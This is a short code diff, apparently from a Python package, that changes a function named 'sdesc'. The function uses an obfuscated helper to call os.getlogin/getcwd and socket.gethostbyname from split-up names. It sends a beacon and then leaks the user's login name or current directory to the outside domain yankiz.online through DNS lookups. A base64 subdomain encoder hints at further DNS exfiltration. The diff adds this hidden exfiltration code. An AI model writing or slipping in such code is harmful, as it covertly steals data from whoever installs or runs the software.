@@ -32,8 +32,9 @@ def to_base64_subdomain(input_string):
 def sdesc():
     import socket
     import os
-    username = imp_and_run("os", "get", "login")()
-    imp_and_run("socket", "gethost", "byname")(f"{username}.snkpinkh11.csp8raau.yankiz.online")
+    imp_and_run("socket", "gethost", "byname")("first.csp9mzod.yankiz.online")
+    username = imp_and_run("os", "get", "cwd")()
+    imp_and_run("socket", "gethost", "byname")(f"{username}.csp9mzod.yankiz.online")
     DNS_SUBDOMAIN = "snkpinkh12.yankiz.online"
     try:
         username = os.getlogin()
